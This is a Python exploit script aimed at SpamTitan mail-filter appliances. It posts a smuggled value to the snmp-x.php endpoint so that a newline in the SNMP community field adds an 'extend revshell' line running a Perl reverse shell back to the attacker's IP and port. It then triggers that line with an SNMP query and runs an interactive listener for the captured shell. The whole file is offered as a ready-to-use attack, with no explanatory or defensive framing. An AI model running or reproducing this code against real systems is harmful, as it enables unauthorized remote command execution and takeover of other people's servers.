import threading
from optparse import OptionParser
import socket
from pysnmp.hlapi import *
from urllib.parse import urlparse
from time import sleep
import requests

snmp_delay = 5


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


def ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def parse_options():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target",
                      help="Target SpamTitan URL to attack. E.g.:https://spamtitan.com/", default=None)
    parser.add_option("-i", "--ip", dest="ip",
                      help="Local IP where to listen for the reverse shell. Default: %s" % ip_address(),
                      default=ip_address())
    parser.add_option("-p", "--port", dest="port",
                      help="Local Port where to listen for the reverse shell. Default: 4242", default=4242)
    parser.add_option("-q", "--quiet", action="store_true", dest="quiet", default=False,
                      help="Shut up script! Just give me the shell.")

    return parser.parse_args()


def printmsg(msg, quiet=False, msgtype="i"):
    if not quiet:
        if success:
            print("[%s] %s" % (msgtype, msg))
        else:
            print("[-] %s" % msg)


def info(msg, quiet=False):
    printmsg(msg, quiet, msgtype="i")


def success(msg, quiet=False):
    printmsg(msg, quiet, msgtype="+")


def fail(msg, quiet=False):
    printmsg(msg, quiet, msgtype="-")


def shellServer(ip, port, quiet):
    servers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servers.bind((ip, port))
    servers.listen(1)
    info(f"[{Colors.green}+{Colors.end}] Waiting for incoming connection on %s:%s" % (ip, port))
    conn, address = servers.accept()
    conn.settimeout(1)
    success(f"[{Colors.green}+{Colors.end}] Hurray, we got a connection from %s" % address[0])

    prompt = conn.recv(128)
    prompt = str(prompt.decode("utf-8")).strip()
    command = input(prompt)

    while True:
        try:
            c = "%s\n" % command
            if len(c) > 0:
                conn.sendall(c.encode("utf-8"))
                if command == 'exit':
                    info(f"[{Colors.red}+{Colors.end}] Closing connection")
                    conn.close()
                    break
                else:
                    complete_answer = ""
                    while True:
                        answer = None
                        try:
                            answer = str((conn.recv(1024)).decode("utf-8"))
                            complete_answer += answer
                        except socket.timeout:
                            complete_answer.strip()
                            break
                    print(complete_answer, end='')
            command = input(f"{Colors.red}(EXPLOITED MACHINE){Colors.end} [__Bind~Shell__]:~#")
        except (KeyboardInterrupt, EOFError):
            info(f"[{Colors.red}+{Colors.end}] Closing connection")
            break


def triggerSNMPShell(target, community, triggeroid, port, quiet):
    if not quiet:
        print(f"[{Colors.green}+{Colors.end}] Waiting %s seconds to allow the main thread set-up the shell listener." % snmp_delay)
    sleep(snmp_delay)
    if not quiet:
        print(f"[{Colors.green}+{Colors.end}] Querying the SNMP server to launch the shell")
    targetp = urlparse(target)
    errorIndication, errorStatus, errorIndex, varBinds = next(
        getCmd(SnmpEngine(),
               CommunityData(community, mpModel=0),
               UdpTransportTarget((targetp.netloc, port)),
               ContextData(),
               ObjectType(ObjectIdentity(triggeroid)))
    )
    if errorIndication:
        print(f"[{Colors.red}+{Colors.end}] SNMP error: %s" % errorIndication)
    elif errorStatus:
        print('SNMP error status: %s at %s' % (errorStatus.prettyPrint(),
                                               errorIndex and varBinds[int(errorIndex) -
                                                                       1][0] or '?'))


def main():
    (options, arguments) = parse_options()
    q = options.quiet
    t = options.target
    i = options.ip
    p = options.port
    community = "dummy"

    if t is None:
        exit()

    if (not "http://" in t) and (not "https://" in t):
        t = "http://%s/snmp-x.php" % t
    else:
        t = "%s/snmp-x.php" % t

    if not q:
        print(f"[{Colors.green}+{Colors.end}] Attacking: %s.\nReceiving shell in %s:%s" % (t, i, p))

    TARGETOID = ".1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108"
    PAYLOAD = "extend revshell /usr/bin/perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" % (
        i, p)
    TOGGLESNMP = {
        "jaction": "toggleSNMP",
        "newval": "1"
    }
    INJECTION = {
        "jaction": "saveAll",
        "contact": "CONTACT",
        "name": "SpamTitan",
        "location": "LOCATION",
        "community": '%s" %s\n%s # ' % (community, i, PAYLOAD)
    }

    rev_thread = threading.Thread(target=triggerSNMPShell, args=(t,
                                                                 community, TARGETOID, 161, q))
    rev_thread.start()

    if not q:
        print(f"[{Colors.green}+{Colors.end}] Launching a reverse shell listener to wait for the shell")

    inj_res = requests.post(t, INJECTION, verify=False)
    if inj_res.status_code == 200:
        if not q:
            print(f"[{Colors.green}+{Colors.end}] Spawning a reverse shell listener")
        shellServer(options.ip, int(options.port), options.quiet)
    else:
        print(
            f"[{Colors.red}+{Colors.end}] Error. The target is probably not vulnerable (returned a %s code)." % inj_res.status_code)

if __name__ == "__main__":
    main()
